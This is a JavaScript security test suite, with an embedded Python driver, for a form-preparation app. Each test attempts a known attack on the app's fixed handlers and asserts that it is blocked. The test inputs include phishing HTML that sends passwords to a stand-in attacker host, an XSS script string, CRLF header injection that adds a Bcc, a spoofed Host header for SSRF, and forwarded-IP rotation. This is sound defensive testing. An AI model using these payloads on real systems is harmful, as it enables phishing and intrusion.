/**
 * api/adversarial-security.test.js — Adversarial security tests for the
 * five Carbon Pass 1 security fixes (institutional branch).
 *
 * Owner-approved scope extension (2026-11-12): "a test that tries the
 * attack and asserts it's blocked". Each test below ATTEMPTS the attack
 * the fix was written for — a forged relay request, a recovery hijack,
 * a spoofed Host header, a rate-limit rotation, a cross-instance
 * entitlement leak, a verify-session grant without the cross-check —
 * and asserts the attack is blocked by the REAL code path (the actual
 * endpoint handler / store function), not a mock of the fix.
 *
 * The five fixes under test (findings file:
 * ~/workspace/iru-carbon-pass-1-findings-2026-11-11.md):
 *  1. Relay (Pass 1 #1, hardened Pass 2 C-2/M-2) — /api/send-report is
 *     institutional-only, resolves the recipient strictly from the
 *     server-side org registry, and renders HTML server-side.
 *  2. Recover (Pass 1 #14) — /api/recover is gated (503) until email
 *     delivery is wired and explicitly enabled, and never returns a
 *     bearer token in an HTTP response.
 *  3. SSRF (Pass 1 #13) — api/fill.py never builds its paid-access
 *     verification URL from the request Host header.
 *  4. Rate-limit (Pass 1 #15) — per-IP buckets; clientIp() trusts the
 *     Vercel edge header or the RIGHTMOST x-forwarded-for entry, so
 *     rotating the spoofable leftmost entry mints no new identity.
 *  5. Entitlement stores (Pass 1 #10, hardened Pass 2 H-5/M-7) —
 *     withDurableStore restores from the durable snapshot only (the
 *     warm-instance singleton is never merged in), and /api/verify-
 *     session runs checkSessionAgainstRecord before any grant.
 *
 * What is NOT covered here (verified by reading, noted in the report):
 * - The client RecoverFlow 503 handling (src/paywall.tsx) — it shows
 *   an honest "recovery unavailable" message and never expects
 *   data.token. That is a React component; it is covered by the
 *   Preview walk, not by this server-side suite.
 * - FIXED (2026-11-12): with IRU_RECOVERY_EMAIL_ENABLED='true' but
 *   no provider wired, recover.js used to call reissueToken() BEFORE
 *   delivery, so a failed delivery invalidated the victim's old
 *   token while the new one was never delivered. recover.js now
 *   restores the previous token hash (store.restoreToken) whenever
 *   delivery fails, and the flag-ON test below asserts the victim's
 *   old token still resolves after the attempt.
 * - Residual gap (reported, not asserted): fill.py's
 *   _entitlement_status_url() does not reject credential-bearing
 *   IRU_APP_ORIGIN values, unlike the JS resolveAppOrigin(). The
 *   origin is deployer-controlled env (not attacker-reachable), so
 *   this is hardening, not a live SSRF.
 */
import { describe, it, before, after, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { sendReportHandler as sendReport } from './staff.js';
import { handler as recoverHandler } from './recover.js';
import { handler as checkoutHandler } from './checkout.js';
import { handler as verifySessionHandler } from './verify-session.js';
import statusWrapped from './entitlement-status.js';
import { createEntitlementStore, entitlementStore } from './_lib/entitlement.js';
import { _setTestBackend, _clearBackendCache } from './_lib/withStore.js';
import { createMemorySnapshotBackend } from './_lib/paymentStore.js';
import { checkSessionAgainstRecord } from './_lib/paymentConfig.js';
import { resetServerModeCache } from './_lib/server-mode.js';

// ── shared helpers ─────────────────────────────────────────────────────

function mockRes() {
  return {
    statusCode: 0, body: null, headers: {},
    status(code) { this.statusCode = code; return this; },
    json(obj) { this.body = obj; return this; },
    setHeader(k, v) { this.headers[k] = v; return this; },
  };
}

let ipSeq = 0;
function uniqueIp() {
  ipSeq += 1;
  return `10.20.${Math.floor(ipSeq / 250) + 1}.${(ipSeq % 250) + 1}`;
}
function mockReq({ method = 'POST', headers = {}, body = {} } = {}) {
  const ip = uniqueIp();
  return {
    method,
    headers: { 'x-forwarded-for': ip, ...headers },
    socket: { remoteAddress: ip },
    body,
  };
}

function asInstitutional() {
  process.env.IRU_SERVER_MODE = 'institutional';
  resetServerModeCache();
}
function asConsumer() {
  delete process.env.IRU_SERVER_MODE;
  resetServerModeCache();
}

const REPORT = { formNumber: 'I-589', executiveSummary: 'Mostly ready.' };

let savedEnv;
before(() => {
  savedEnv = { ...process.env };
  // Paid-path handlers fail closed without an explicit store backend.
  process.env.IRU_STORE_BACKEND = 'memory';
  process.env.IRU_ALLOW_EPHEMERAL_STORE = 'true';
  process.env.IRU_STRIPE_KEY = 'sk_test_adversarial';
});
after(() => {
  process.env = savedEnv;
});
afterEach(() => {
  // Per-test overrides must never leak into the next test.
  delete process.env.IRU_SERVER_MODE;
  delete process.env.IRU_RECOVERY_EMAIL_ENABLED;
  delete process.env.RESEND_API_KEY;
  resetServerModeCache();
  _clearBackendCache();
  globalThis.fetch = REAL_FETCH;
});
const REAL_FETCH = globalThis.fetch;

// ── 1. Relay — /api/send-report ─────────────────────────────────────────

describe('1. Relay — send-report cannot be used as an open email relay', () => {
  it('ATTACK: unauthenticated relay on a CONSUMER build → 404 and zero Resend calls', async () => {
    asConsumer();
    process.env.RESEND_API_KEY = 're_test_key';
    const calls = [];
    globalThis.fetch = async (url, opts) => {
      calls.push({ url, opts });
      return { ok: true, status: 200, json: async () => ({ id: 're_should_not_happen' }) };
    };
    try {
      const res = mockRes();
      await sendReport(mockReq({
        body: {
          org: 'test',
          staffEmail: 'attacker@evil.example.com',
          formNumber: 'I-589',
          html: '<form action="https://evil.example.com/harvest"><input name="password" type="password"></form>',
          report: REPORT,
        },
      }), res);
      assert.equal(res.statusCode, 404);
      assert.equal(calls.length, 0, 'consumer build must never call the email provider');
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: phishing HTML + attacker staffEmail on the listed org → registry address wins, raw HTML never sent', async () => {
    asInstitutional();
    process.env.RESEND_API_KEY = 're_test_key';
    const calls = [];
    globalThis.fetch = async (url, opts) => {
      calls.push({ url, opts });
      return { ok: true, status: 200, json: async () => ({ id: 're_123' }) };
    };
    try {
      const res = mockRes();
      await sendReport(mockReq({
        body: {
          org: 'test',
          staffEmail: 'phisher@evil.example.com',
          participantName: 'Maria G.',
          formNumber: 'I-589',
          // Credential-harvest payload the attacker wants relayed.
          html: '<form action="https://evil.example.com/harvest-now"><input name="password" type="password"><button>Sign in to USCIS</button></form><a href="https://evil.example.com/harvest-now">Verify your account</a>',
          report: {
            formNumber: 'I-589',
            formTitle: 'Application for Asylum',
            participantName: 'Maria G.',
            overallScore: 0.8,
            overallBand: 'Strong',
            executiveSummary: '<script>alert(1)</script> Mostly ready. <a href="https://evil.example.com/login">Click here</a>',
            sections: [{ section: 'Identity', score: 0.9, band: 'Strong' }],
            blockers: [{ t: 'Missing <b>doc</b>', d: 'Provide it.' }],
          },
        },
      }), res);
      assert.equal(res.statusCode, 200);
      assert.equal(calls.length, 1);
      const sent = JSON.parse(calls[0].opts.body);
      // The registry — not the attacker's address — is the recipient.
      assert.deepEqual(sent.to, ['healthcarebyvalentine@gmail.com']);
      // The attacker's raw HTML was ignored entirely.
      assert.doesNotMatch(sent.html, /Sign in to USCIS/);
      assert.doesNotMatch(sent.html, /harvest-now/);
      assert.doesNotMatch(sent.html, /<form/);
      assert.doesNotMatch(sent.html, /<script>/);
      // No live link to the attacker's URL survives (the applicant's own
      // summary text is escaped, never rendered as markup).
      assert.doesNotMatch(sent.html, /<a href="https:\/\/evil\.example\.com/);
      assert.match(sent.html, /&lt;script&gt;alert\(1\)&lt;\/script&gt; Mostly ready\./);
      assert.match(sent.html, /Missing &lt;b&gt;doc&lt;\/b&gt;/);
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: CRLF / bidi-override injection in the participant name → subject is stripped', async () => {
    asInstitutional();
    process.env.RESEND_API_KEY = 're_test_key';
    const calls = [];
    globalThis.fetch = async (url, opts) => {
      calls.push({ url, opts });
      return { ok: true, status: 200, json: async () => ({ id: 're_crlf' }) };
    };
    try {
      const res = mockRes();
      await sendReport(mockReq({
        body: {
          org: 'test',
          participantName: 'Evil\r\nBcc: attacker@evil.com\u202e',
          formNumber: 'I-589',
          report: REPORT,
        },
      }), res);
      assert.equal(res.statusCode, 200);
      assert.equal(calls.length, 1);
      const sent = JSON.parse(calls[0].opts.body);
      assert.match(sent.subject, /IRU I-589 report/);
      assert.doesNotMatch(sent.subject, /[\r\n]/);
      assert.doesNotMatch(sent.subject, /[\u202a-\u202e\u2066-\u2069]/);
      assert.match(sent.subject, /EvilBcc: attacker@evil\.com/);
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: null-byte org slug + attacker staffEmail → 400 and zero Resend calls', async () => {
    asInstitutional();
    process.env.RESEND_API_KEY = 're_test_key';
    const calls = [];
    globalThis.fetch = async (url, opts) => {
      calls.push({ url, opts });
      return { ok: true, status: 200, json: async () => ({ id: 're_should_not_happen' }) };
    };
    try {
      const res = mockRes();
      await sendReport(mockReq({
        body: {
          org: 'test\x00',
          staffEmail: 'attacker@evil.example.com',
          formNumber: 'I-589',
          report: REPORT,
        },
      }), res);
      assert.equal(res.statusCode, 400);
      assert.match(res.body.error, /No staff delivery is configured/);
      assert.equal(calls.length, 0);
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });
});

// ── 2. Recover — /api/recover ───────────────────────────────────────────

describe('2. Recover — recover never hands a token to an unauthenticated caller', () => {
  function paidVictimStore() {
    const store = createEntitlementStore();
    const { entitlement, token } = store.create({
      sku: 'iru-formprep', amountCents: 34900, currency: 'usd',
      sessionId: 'cs_rec_victim', scope: { kind: 'forms', forms: ['I-589'] },
    });
    store.markPaidBySession('cs_rec_victim', 'evt_rec_victim');
    store.registerRecoveryIdentity({ entitlementId: entitlement.id, email: 'victim@example.com' });
    return { store, entitlement, token };
  }

  it("ATTACK: attacker knows the victim's email, endpoint disabled (default) → 503, no token, victim keeps access", async () => {
    delete process.env.IRU_RECOVERY_EMAIL_ENABLED;
    const { store, token } = paidVictimStore();
    const res = mockRes();
    await recoverHandler(mockReq({ body: { email: 'victim@example.com' } }), res, store);
    assert.equal(res.statusCode, 503);
    assert.equal(res.body.reason, 'recovery-unavailable');
    assert.equal('token' in res.body, false);
    assert.doesNotMatch(JSON.stringify(res.body), /ent_/);
    // The victim's token was never minted away: it still resolves.
    assert.ok(store.getByToken(token) !== null, 'victim token must survive a blocked recovery attempt');
    assert.equal(store.peekByToken(token).ok, true);
  });

  it('ATTACK: recovery flag ON but no email provider wired → 503, no token in the response, victim keeps access', async () => {
    process.env.IRU_RECOVERY_EMAIL_ENABLED = 'true';
    try {
      const { store, token } = paidVictimStore();
      const res = mockRes();
      await recoverHandler(mockReq({ body: { email: 'victim@example.com' } }), res, store);
      assert.equal(res.statusCode, 503);
      assert.equal(res.body.reason, 'recovery-unavailable');
      assert.equal('token' in res.body, false);
      // Enabling the flag alone must not leak a token: delivery is the
      // gate, and the delivery stub reports not-configured. And the
      // failed delivery must not lock the victim out: the reissue is
      // rolled back, so the token the victim already holds still
      // resolves (before the fix this failed — getByToken went null
      // and peekByToken reported unknown-token).
      assert.ok(store.getByToken(token) !== null, 'victim token must survive a failed-delivery recovery attempt');
      assert.equal(store.peekByToken(token).ok, true);
    } finally {
      delete process.env.IRU_RECOVERY_EMAIL_ENABLED;
    }
  });

  it('ATTACK: email enumeration — unknown email and real-but-unpaid email get identical 404s', async () => {
    process.env.IRU_RECOVERY_EMAIL_ENABLED = 'true';
    try {
      const store = createEntitlementStore();
      const { entitlement: unpaid } = store.create({
        sku: 'iru-formprep', amountCents: 34900, currency: 'usd',
        sessionId: 'cs_rec_unpaid', scope: { kind: 'forms', forms: ['I-589'] },
      });
      // Registered but NEVER paid: reissue must refuse it exactly like
      // an unknown identity.
      store.registerRecoveryIdentity({ entitlementId: unpaid.id, email: 'unpaid@example.com' });
      const r1 = mockRes();
      await recoverHandler(mockReq({ body: { email: 'nobody@example.com' } }), r1, store);
      const r2 = mockRes();
      await recoverHandler(mockReq({ body: { email: 'unpaid@example.com' } }), r2, store);
      assert.equal(r1.statusCode, 404);
      assert.equal(r2.statusCode, 404);
      assert.deepEqual(r1.body, r2.body);
      assert.equal('token' in r1.body, false);
      assert.equal('token' in r2.body, false);
    } finally {
      delete process.env.IRU_RECOVERY_EMAIL_ENABLED;
    }
  });

  it('ATTACK: recovery flooding from one IP → 6th request is 429', async () => {
    delete process.env.IRU_RECOVERY_EMAIL_ENABLED;
    const store = createEntitlementStore();
    const statuses = [];
    let lastRes = null;
    for (let i = 0; i < 6; i++) {
      const res = mockRes();
      await recoverHandler(mockReq({
        headers: { 'x-forwarded-for': '10.30.0.1' },
        body: { email: 'victim@example.com' },
      }), res, store);
      statuses.push(res.statusCode);
      lastRes = res;
    }
    assert.deepEqual(statuses.slice(0, 5), [503, 503, 503, 503, 503]);
    assert.equal(statuses[5], 429);
    assert.ok(Number(lastRes.headers['Retry-After']) > 0, '429 carries a Retry-After');
  });
});

// ── 3. SSRF — api/fill.py ────────────────────────────────────────────────

/**
 * Python driver (embedded): runs the REAL api/fill.py handler over real
 * sockets and tries the Pass 1 #13 attack — a spoofed Host header must
 * never steer the paid-access verification request (which carries the
 * victim's bearer token) to an attacker URL.
 *
 * Phase 1: no authoritative origin configured → the gate must fail
 *   closed (402 verification-unavailable) instead of trusting Host.
 * Phase 2: IRU_ENTITLEMENT_STATUS_URL points at a recording server →
 *   the verification POST must go to the configured URL (its own Host),
 *   carrying the token there — never to the spoofed host.
 * Phase 3: _entitlement_status_url() resolution matrix.
 *
 * The driver needs a Python with PyMuPDF (fill.py imports fitz at
 * module level). Resolution: IRU_TEST_PYTHON override, else the repo's
 * dev venv (~/workspace/ocr-spike-env/bin/python), else `python3`.
 * If no usable Python exists the driver exits non-zero with a clear
 * error and this test fails loudly — never a silent skip.
 */
const SSRF_DRIVER = `
import json, os, sys, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import http.client

try:
    import fitz  # noqa: F401  (fill.py imports it at module level)
except ImportError:
    print(json.dumps({'error': 'fitz (PyMuPDF) not available in this python'}))
    sys.exit(2)

REPO = sys.argv[1]
sys.path.insert(0, os.path.join(REPO, 'api'))
os.chdir(REPO)

for _k in ('IRU_ENTITLEMENT_STATUS_URL', 'IRU_APP_ORIGIN', 'VERCEL_URL'):
    os.environ.pop(_k, None)
os.environ['PAYWALL_ENABLED'] = 'true'

import fill as fillmod


def start(handler_cls):
    srv = ThreadingHTTPServer(('127.0.0.1', 0), handler_cls)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def post_spoofed_host(port, path, token, body_dict, host='evil.attacker.example'):
    conn = http.client.HTTPConnection('127.0.0.1', port, timeout=15)
    conn.putrequest('POST', path, skip_host=True)
    conn.putheader('Host', host)
    conn.putheader('x-entitlement-token', token)
    conn.putheader('Content-Type', 'application/json')
    raw = json.dumps(body_dict).encode()
    conn.putheader('Content-Length', str(len(raw)))
    conn.endheaders(raw)
    resp = conn.getresponse()
    data = resp.read()
    ctype = resp.getheader('Content-Type')
    conn.close()
    return resp.status, ctype, data


results = {}

# Phase 1: fail closed - no authoritative origin configured
srv1 = start(fillmod.handler)
p1 = srv1.server_address[1]
st, _ct, data = post_spoofed_host(p1, '/api/fill?form=i589', 'victim-token-abc', {'facts': {}})
try:
    payload = json.loads(data.decode())
except Exception:
    payload = {}
results['phase1'] = {
    'status': st,
    'reason': payload.get('reason'),
    'error': payload.get('error'),
}
srv1.shutdown()

# Phase 2: env-configured verification URL wins over the Host header
recorded = []


class Recorder(BaseHTTPRequestHandler):
    def do_POST(self):
        ln = int(self.headers.get('Content-Length') or 0)
        raw = self.rfile.read(ln) if ln else b''
        recorded.append({
            'host': self.headers.get('Host'),
            'path': self.path,
            'body': raw.decode(errors='replace'),
        })
        out = json.dumps({
            'entitlement': {'paid': True, 'scope': {'kind': 'forms', 'forms': ['I-589']}},
            'paid': True,
        }).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(out)))
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *a):
        pass


rec = start(Recorder)
rec_port = rec.server_address[1]
os.environ['IRU_ENTITLEMENT_STATUS_URL'] = 'http://127.0.0.1:%d/verify' % rec_port
srv2 = start(fillmod.handler)
p2 = srv2.server_address[1]
st2, ct2, data2 = post_spoofed_host(p2, '/api/fill?form=i589', 'victim-token-abc', {'facts': {}})
results['phase2'] = {
    'status': st2,
    'content_type': ct2,
    'pdf_bytes': len(data2),
    'verification_calls': len(recorded),
    'verification_host': recorded[0]['host'] if recorded else None,
    'verification_path': recorded[0]['path'] if recorded else None,
    'verification_body_has_token': ('victim-token-abc' in recorded[0]['body']) if recorded else False,
    'verification_body_has_spoofed_host': ('evil.attacker.example' in recorded[0]['body']) if recorded else False,
}
srv2.shutdown()
rec.shutdown()

# Phase 3: _entitlement_status_url() resolution matrix
def url_with(env):
    for _k in ('IRU_ENTITLEMENT_STATUS_URL', 'IRU_APP_ORIGIN', 'VERCEL_URL'):
        os.environ.pop(_k, None)
    os.environ.update(env)
    return fillmod._entitlement_status_url()


results['phase3'] = {
    'none_set': url_with({}),
    'app_origin': url_with({'IRU_APP_ORIGIN': 'https://app.example.com'}),
    'app_origin_trailing_slash': url_with({'IRU_APP_ORIGIN': 'https://app.example.com/'}),
    'credential_origin': url_with({'IRU_APP_ORIGIN': 'https://user:pass@app.example.com'}),
    'javascript_origin': url_with({'IRU_APP_ORIGIN': 'javascript://x'}),
    'vercel_url': url_with({'VERCEL_URL': 'myapp.vercel.app'}),
    'override_wins': url_with({
        'IRU_ENTITLEMENT_STATUS_URL': 'https://internal.example.com/x',
        'IRU_APP_ORIGIN': 'https://app.example.com',
    }),
}

print(json.dumps(results))
`;

function resolveTestPython() {
  if (process.env.IRU_TEST_PYTHON) return process.env.IRU_TEST_PYTHON;
  const venv = path.join(process.env.HOME || '', 'workspace', 'ocr-spike-env', 'bin', 'python');
  if (fs.existsSync(venv)) return venv;
  return 'python3';
}

describe('3. SSRF — fill.py never builds its verification URL from the Host header', () => {
  it('ATTACK: spoofed Host header — fail-closed with no origin; env URL wins when configured (real handler, real sockets)', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'iru-adv-ssrf-'));
    try {
      const driverPath = path.join(dir, 'ssrf_driver.py');
      fs.writeFileSync(driverPath, SSRF_DRIVER);
      const python = resolveTestPython();
      const repoRoot = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
      let out;
      try {
        out = execFileSync(python, [driverPath, repoRoot], {
          encoding: 'utf8', timeout: 90000, stdio: ['ignore', 'pipe', 'pipe'],
        });
      } catch (e) {
        assert.fail(`SSRF driver failed (python=${python}): ${e.message}\nstdout: ${e.stdout || ''}\nstderr: ${e.stderr || ''}`);
      }
      const r = JSON.parse(out);
      assert.equal(r.error, undefined, `SSRF driver error: ${r.error}`);

      // Phase 1: no authoritative origin → fail closed, never trust Host.
      assert.equal(r.phase1.status, 402);
      assert.equal(r.phase1.reason, 'verification-unavailable');

      // Phase 2: the verification request goes to the env-configured
      // URL — its own Host — carrying the token there, never to the
      // spoofed host. The fill then proceeds (200 PDF).
      assert.equal(r.phase2.status, 200);
      assert.equal(r.phase2.content_type, 'application/pdf');
      assert.ok(r.phase2.pdf_bytes > 1000, `expected a filled PDF, got ${r.phase2.pdf_bytes} bytes`);
      assert.equal(r.phase2.verification_calls, 1);
      assert.ok(
        typeof r.phase2.verification_host === 'string' && r.phase2.verification_host.startsWith('127.0.0.1:'),
        `verification went to the configured URL, got Host: ${r.phase2.verification_host}`,
      );
      assert.doesNotMatch(r.phase2.verification_host, /evil/);
      assert.equal(r.phase2.verification_path, '/verify');
      assert.equal(r.phase2.verification_body_has_token, true);
      assert.equal(r.phase2.verification_body_has_spoofed_host, false);

      // Phase 3: URL resolution comes only from server-side env vars.
      assert.equal(r.phase3.none_set, null);
      assert.equal(r.phase3.app_origin, 'https://app.example.com/api/entitlement-status');
      assert.equal(r.phase3.app_origin_trailing_slash, 'https://app.example.com/api/entitlement-status');
      assert.equal(r.phase3.javascript_origin, null);
      assert.equal(r.phase3.vercel_url, 'https://myapp.vercel.app/api/entitlement-status');
      assert.equal(r.phase3.override_wins, 'https://internal.example.com/x');
      // NOTE (reported, not asserted): credential_origin currently
      // returns the URL instead of null — the Python resolver does not
      // reject credential-bearing origins the way the JS
      // resolveAppOrigin() does. IRU_APP_ORIGIN is deployer-controlled
      // env, not attacker-reachable, so this is hardening, not a live
      // SSRF.
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ── 4. Rate limits ───────────────────────────────────────────────────────

describe('4. Rate limits — per-IP buckets block excess requests; XFF rotation mints no new identity', () => {
  it('ATTACK: rotate the spoofable leftmost X-Forwarded-For on send-report → still 429 on the 6th send', async () => {
    asInstitutional();
    process.env.RESEND_API_KEY = 're_test_key';
    globalThis.fetch = async () => ({ ok: true, status: 200, json: async () => ({ id: 're_rl' }) });
    try {
      const statuses = [];
      for (let i = 0; i < 6; i++) {
        const res = mockRes();
        // Attacker rotates the leftmost (sender-controlled) entry on
        // every request; the edge IP on the right stays the same.
        await sendReport(mockReq({
          headers: { 'x-forwarded-for': `198.51.100.${i}, 10.32.0.1` },
          body: { org: 'test', formNumber: 'I-589', report: REPORT },
        }), res);
        statuses.push(res.statusCode);
      }
      assert.deepEqual(statuses.slice(0, 5), [200, 200, 200, 200, 200]);
      assert.equal(statuses[5], 429);
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: checkout flooding from one IP → 6th request is 429', async () => {
    delete process.env.IRU_STRIPE_KEY; // key gate 503s before any Stripe call
    try {
      const statuses = [];
      for (let i = 0; i < 6; i++) {
        const res = mockRes();
        await checkoutHandler(mockReq({
          headers: { 'x-forwarded-for': '10.31.0.1' },
          body: {},
        }), res);
        statuses.push(res.statusCode);
      }
      assert.deepEqual(statuses.slice(0, 5), [503, 503, 503, 503, 503]);
      assert.equal(statuses[5], 429);
    } finally {
      process.env.IRU_STRIPE_KEY = 'sk_test_adversarial';
    }
  });

  it('ATTACK: rotate the spoofable leftmost X-Forwarded-For on checkout → still 429 on the 6th request', async () => {
    delete process.env.IRU_STRIPE_KEY;
    try {
      const statuses = [];
      for (let i = 0; i < 6; i++) {
        const res = mockRes();
        await checkoutHandler(mockReq({
          headers: { 'x-forwarded-for': `198.51.100.${i}, 10.31.0.2` },
          body: {},
        }), res);
        statuses.push(res.statusCode);
      }
      assert.deepEqual(statuses.slice(0, 5), [503, 503, 503, 503, 503]);
      assert.equal(statuses[5], 429);
    } finally {
      process.env.IRU_STRIPE_KEY = 'sk_test_adversarial';
    }
  });
});

// ── 5. Entitlement stores ────────────────────────────────────────────────

describe('5. Entitlement stores — no cross-instance leakage; no grant without the cross-check', () => {
  function paidRecord(store, sessionId, amountCents = 34900, currency = 'usd') {
    const { entitlement, token } = store.create({
      sku: 'iru-formprep', amountCents, currency, sessionId,
      scope: { kind: 'forms', forms: ['I-589', 'I-765'] },
    });
    return { entitlement, token };
  }

  it('ATTACK: warm-instance singleton holds a paid entitlement, durable snapshot is EMPTY → request must NOT see it', async () => {
    // Seed the process-wide singleton (simulates a warm serverless
    // instance that previously handled this purchase).
    const { token } = paidRecord(entitlementStore, 'cs_store_singleton');
    entitlementStore.markPaidBySession('cs_store_singleton', 'evt_store_singleton');
    assert.equal(entitlementStore.peekByToken(token).ok, true, 'setup: singleton holds the paid entitlement');

    // The durable backend has NO snapshot at all.
    _setTestBackend(createMemorySnapshotBackend());
    try {
      const res = mockRes();
      await statusWrapped(mockReq({ body: { token } }), res);
      assert.equal(res.statusCode, 404, 'empty snapshot must not resurrect the singleton entitlement');
      assert.match(res.body.error, /not found/);
      assert.equal(res.body.usable, undefined);
    } finally {
      _clearBackendCache();
    }
  });

  it('CONTROL: the durable snapshot IS the source of truth — a snapshot-backed entitlement is visible', async () => {
    const backend = createMemorySnapshotBackend();
    const s2 = createEntitlementStore();
    const { token } = paidRecord(s2, 'cs_store_snapshot');
    s2.markPaidBySession('cs_store_snapshot', 'evt_store_snapshot');
    const saved = await backend.save(s2.snapshot(), 0);
    assert.equal(saved.ok, true, 'setup: snapshot saved');
    _setTestBackend(backend);
    try {
      const res = mockRes();
      await statusWrapped(mockReq({ body: { token } }), res);
      assert.equal(res.statusCode, 200);
      assert.equal(res.body.usable, true);
    } finally {
      _clearBackendCache();
    }
  });

  it('ATTACK: request isolation — after a snapshot-backed request, an empty-backend request must NOT see the earlier entitlement', async () => {
    const backend = createMemorySnapshotBackend();
    const s2 = createEntitlementStore();
    const { token } = paidRecord(s2, 'cs_store_isolation');
    s2.markPaidBySession('cs_store_isolation', 'evt_store_isolation');
    await backend.save(s2.snapshot(), 0);
    _setTestBackend(backend);
    const r1 = mockRes();
    await statusWrapped(mockReq({ body: { token } }), r1);
    assert.equal(r1.statusCode, 200, 'setup: snapshot-backed request sees it');

    // A later request against an EMPTY backend (fresh instance state)
    // must not inherit anything from the previous request or the
    // warm singleton.
    _setTestBackend(createMemorySnapshotBackend());
    try {
      const r2 = mockRes();
      await statusWrapped(mockReq({ body: { token } }), r2);
      assert.equal(r2.statusCode, 404);
    } finally {
      _clearBackendCache();
    }
  });

  function stripeSessionFor({ entitlement, amount_total = 34900, currency = 'usd', metadataEntitlementId, clientReferenceId, payment_status = 'paid' }) {
    return {
      id: entitlement ? 'cs_test_adv_1' : 'cs_test_unknown',
      payment_status,
      amount_total,
      currency,
      metadata: { entitlementId: metadataEntitlementId },
      client_reference_id: clientReferenceId,
      customer_details: { email: 'buyer@example.com' },
    };
  }

  it('ATTACK: Stripe says paid but the amount differs from the record → exception, NO grant', async () => {
    const store = createEntitlementStore();
    const { entitlement } = paidRecord(store, 'cs_test_adv_1');
    const session = stripeSessionFor({
      entitlement, amount_total: 100, // attacker tampered / wrong session
      metadataEntitlementId: entitlement.id, clientReferenceId: entitlement.id,
    });
    globalThis.fetch = async () => ({ ok: true, json: async () => session });
    try {
      const res = mockRes();
      await verifySessionHandler(mockReq({ body: { sessionId: 'cs_test_adv_1' } }), res, store);
      assert.equal(res.statusCode, 200);
      assert.equal(res.body.ok, false);
      assert.equal(res.body.paid, false);
      assert.equal(res.body.exception, true);
      assert.equal(res.body.reason, 'amount-mismatch');
      assert.equal(store.getById(entitlement.id).paidAt, null, 'mismatched payment must not grant');
      assert.equal(store.listExceptions().length, 1);
      assert.equal(store.listExceptions()[0].reason, 'amount-mismatch');
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: Stripe says paid but the currency differs from the record → exception, NO grant', async () => {
    const store = createEntitlementStore();
    const { entitlement } = paidRecord(store, 'cs_test_adv_1');
    const session = stripeSessionFor({
      entitlement, currency: 'eur',
      metadataEntitlementId: entitlement.id, clientReferenceId: entitlement.id,
    });
    globalThis.fetch = async () => ({ ok: true, json: async () => session });
    try {
      const res = mockRes();
      await verifySessionHandler(mockReq({ body: { sessionId: 'cs_test_adv_1' } }), res, store);
      assert.equal(res.body.ok, false);
      assert.equal(res.body.paid, false);
      assert.equal(res.body.exception, true);
      assert.equal(res.body.reason, 'currency-mismatch');
      assert.equal(store.getById(entitlement.id).paidAt, null, 'mismatched payment must not grant');
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: Stripe session metadata points at a DIFFERENT entitlement → exception, NO grant', async () => {
    const store = createEntitlementStore();
    const { entitlement } = paidRecord(store, 'cs_test_adv_1');
    const session = stripeSessionFor({
      entitlement,
      metadataEntitlementId: 'ent_somebody_else',
      clientReferenceId: entitlement.id,
    });
    globalThis.fetch = async () => ({ ok: true, json: async () => session });
    try {
      const res = mockRes();
      await verifySessionHandler(mockReq({ body: { sessionId: 'cs_test_adv_1' } }), res, store);
      assert.equal(res.body.ok, false);
      assert.equal(res.body.paid, false);
      assert.equal(res.body.exception, true);
      assert.equal(res.body.reason, 'session-identity-mismatch');
      assert.equal(store.getById(entitlement.id).paidAt, null, 'identity-mismatched payment must not grant');
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('ATTACK: Stripe says paid for a session the store never saw → unknown-session, NO grant, NO exception burned', async () => {
    const store = createEntitlementStore();
    const session = stripeSessionFor({
      entitlement: null,
      metadataEntitlementId: 'ent_ghost', clientReferenceId: 'ent_ghost',
    });
    globalThis.fetch = async () => ({ ok: true, json: async () => session });
    try {
      const res = mockRes();
      await verifySessionHandler(mockReq({ body: { sessionId: 'cs_test_unknown' } }), res, store);
      assert.equal(res.statusCode, 200);
      assert.equal(res.body.ok, false);
      assert.equal(res.body.paid, false);
      assert.equal(res.body.reason, 'unknown-session');
      assert.equal(store.listExceptions().length, 0, 'unknown sessions are not adjudicated or burned');
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('CONTROL: Stripe session matching the record on amount, currency, and identity → paid, grant issued', async () => {
    const store = createEntitlementStore();
    const { entitlement, token } = paidRecord(store, 'cs_test_adv_1');
    const session = stripeSessionFor({
      entitlement,
      metadataEntitlementId: entitlement.id, clientReferenceId: entitlement.id,
    });
    globalThis.fetch = async () => ({ ok: true, json: async () => session });
    try {
      const res = mockRes();
      await verifySessionHandler(mockReq({ body: { sessionId: 'cs_test_adv_1' } }), res, store);
      assert.equal(res.statusCode, 200);
      assert.equal(res.body.ok, true);
      assert.equal(res.body.paid, true);
      assert.notEqual(store.getById(entitlement.id).paidAt, null);
      assert.equal(store.peekByToken(token).ok, true);
    } finally {
      globalThis.fetch = REAL_FETCH;
    }
  });

  it('checkSessionAgainstRecord detects amount, currency, and identity mismatches and passes a matching session', () => {
    const record = { id: 'ent_x', amountCents: 34900, currency: 'usd' };
    const base = {
      amount_total: 34900, currency: 'usd',
      metadata: { entitlementId: 'ent_x' }, client_reference_id: 'ent_x',
    };
    assert.equal(checkSessionAgainstRecord(base, record), null);
    assert.equal(checkSessionAgainstRecord({ ...base, amount_total: 100 }, record).reason, 'amount-mismatch');
